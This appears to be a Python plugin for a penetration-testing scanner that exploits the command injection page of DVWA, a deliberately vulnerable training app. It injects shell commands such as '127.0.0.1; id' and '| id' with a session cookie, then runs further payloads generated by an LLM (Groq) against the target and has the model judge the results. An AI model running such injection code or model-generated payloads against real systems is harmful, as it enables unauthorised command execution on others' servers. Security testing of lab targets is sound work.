import urllib.request
import urllib.parse
import re
import time
from typing import Dict, Any
from plugins.base_plugin import BasePlugin
from ai_self_validation import groq_generate_payloads, groq_evaluate_results

class DVWACMDiPlugin(BasePlugin):
    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "DVWA-CMDI",
            "name": "DVWA Command Injection",
            "cvss_score": 10.0,
            "service": "http",
            "vuln_type": "command_injection"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        return service_info.get("service","") in ["http","https"]

    def _send_payload(self, url, payload, cookie):
        """Gửi payload và trả về output thô"""
        try:
            data = urllib.parse.urlencode({"ip": payload, "Submit": "Submit"}).encode()
            req = urllib.request.Request(url, data=data)
            req.add_header("Cookie", cookie)
            t0 = time.time()
            resp = urllib.request.urlopen(req, timeout=5)
            elapsed = round(time.time() - t0, 3)
            body = resp.read().decode('utf-8')
            cmd_output = re.search(r'<pre>(.*?)</pre>', body, re.DOTALL)
            output = cmd_output.group(1).strip() if cmd_output else ""
            return {"output": output, "response_time": elapsed, "error": None}
        except Exception as e:
            return {"output": "", "response_time": -1, "error": str(e)}

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        cookie = context.get("session_cookie","")
        if not cookie:
            return {"status": "PENDING", "evidence": "Chưa có session cookie"}

        url = f"http://{target_ip}:{target_port}/vulnerabilities/exec/"
        all_results = []

        # ── PHASE 1: Payload ban đầu từ knowledge base ────────
        initial_payloads = [
            ("127.0.0.1; id",       "semicolon injection"),
            ("127.0.0.1 && whoami", "AND operator"),
            ("127.0.0.1 | id",      "pipe operator"),
        ]

        print(f"      [CMDi] PHASE 1: Thử payload từ knowledge base...")
        initial_confirmed = None
        for payload, technique in initial_payloads:
            print(f"      [CMDi] [{technique}] Payload: {payload}")
            result = self._send_payload(url, payload, cookie)
            marker_hit = "uid=" in result["output"] or "www-data" in result["output"]
            status = "HIT" if marker_hit else "MISS"
            print(f"      [CMDi] Response time: {result['response_time']}s | Status: {status}")
            if result["output"]:
                print(f"      [CMDi] Output: {result['output'][:100]}...")
            all_results.append({
                "phase": "initial",
                "technique": technique,
                "payload": payload,
                "output": result["output"][:200],
                "response_time": result["response_time"],
                "hit": marker_hit
            })
            if marker_hit and not initial_confirmed:
                initial_confirmed = {"payload": payload, "output": result["output"]}

        if not initial_confirmed:
            return {"status": "FALSE_POSITIVE", "evidence": "Tất cả payload ban đầu không khai thác được"}

        # ── PHASE 2: AI Groq tự sinh payload bổ sung ──────────
        print(f"\n      [CMDi] PHASE 2: AI Groq suy luận và sinh payload bổ sung...")
        ai_plan = groq_generate_payloads(
            plugin_id="DVWA-CMDI",
            service="http command injection",
            endpoint=url,
            initial_result=initial_confirmed
        )

        print(f"      [CMDi] AI Reasoning: {ai_plan.get('reasoning','')}")
        print(f"      [CMDi] Honeypot suspicion: {ai_plan.get('honeypot_suspicion','?')} — {ai_plan.get('honeypot_reason','')}")
        print(f"      [CMDi] Confidence trước verify: {ai_plan.get('confidence_before_verify','?')}%")

        # Thực thi confirm payloads từ AI
        print(f"\n      [CMDi] PHASE 2a: Thực thi confirm payloads...")
        for p in ai_plan.get("confirm_payloads", []):
            payload = p.get("payload","")
            purpose = p.get("purpose","")
            expect  = p.get("expect","")
            print(f"      [CMDi] [AI confirm] Payload: {payload}")
            print(f"      [CMDi]              Purpose: {purpose}")
            print(f"      [CMDi]              Expect : {expect}")
            result = self._send_payload(url, payload, cookie)
            hit = bool(result["output"]) and result["error"] is None
            print(f"      [CMDi] Response time: {result['response_time']}s")
            if result["output"]:
                print(f"      [CMDi] Output: {result['output'][:150]}...")
            else:
                print(f"      [CMDi] Output: (empty)")
            all_results.append({
                "phase": "ai_confirm",
                "purpose": purpose,
                "payload": payload,
                "output": result["output"][:200],
                "response_time": result["response_time"],
                "hit": hit
            })

        # Thực thi honeypot detection payloads
        print(f"\n      [CMDi] PHASE 2b: Honeypot detection payloads...")
        for p in ai_plan.get("honeypot_payloads", []):
            payload = p.get("payload","")
            purpose = p.get("purpose","")
            expect  = p.get("expect","")
            print(f"      [CMDi] [Honeypot check] Payload: {payload}")
            print(f"      [CMDi]                  Purpose: {purpose}")
            print(f"      [CMDi]                  Expect : {expect}")
            result = self._send_payload(url, payload, cookie)
            print(f"      [CMDi] Response time: {result['response_time']}s")
            if result["output"]:
                print(f"      [CMDi] Output: {result['output'][:150]}...")
            else:
                print(f"      [CMDi] Output: (empty)")
            all_results.append({
                "phase": "honeypot_check",
                "purpose": purpose,
                "payload": payload,
                "output": result["output"][:200],
                "response_time": result["response_time"],
                "hit": bool(result["output"])
            })

        # ── PHASE 3: AI đánh giá tổng hợp ────────────────────
        print(f"\n      [CMDi] PHASE 3: AI đánh giá tổng hợp tất cả kết quả...")
        verdict = groq_evaluate_results("DVWA-CMDI", all_results, ai_plan.get("honeypot_suspicion","low"))
        print(f"      [CMDi] Verdict        : {verdict.get('verdict')}")
        print(f"      [CMDi] Confidence     : {verdict.get('confidence_final')}%")
        print(f"      [CMDi] Consistency    : {verdict.get('consistency_check')}")
        print(f"      [CMDi] Honeypot check : {verdict.get('honeypot_conclusion')}")
        print(f"      [CMDi] Final reasoning: {verdict.get('final_reasoning')}")

        final_status = verdict.get("verdict","PENDING")
        if final_status == "HONEYPOT_SUSPECTED":
            final_status = "PENDING"

        return {
            "status": final_status,
            "evidence": (
                f"Command Injection — AI Self-Validation hoàn tất.\n"
                f"      - Initial payload    : {initial_confirmed['payload']}\n"
                f"      - Initial output     : {initial_confirmed['output'][:100]}\n"
                f"      - AI Reasoning       : {ai_plan.get('reasoning','')}\n"
                f"      - Honeypot suspicion : {ai_plan.get('honeypot_suspicion')} — {ai_plan.get('honeypot_reason','')}\n"
                f"      - Confirm payloads   : {len(ai_plan.get('confirm_payloads',[]))} thử thêm\n"
                f"      - Honeypot payloads  : {len(ai_plan.get('honeypot_payloads',[]))} thử\n"
                f"      - Final verdict      : {verdict.get('verdict')} ({verdict.get('confidence_final')}%)\n"
                f"      - Final reasoning    : {verdict.get('final_reasoning')}"
            )
        }
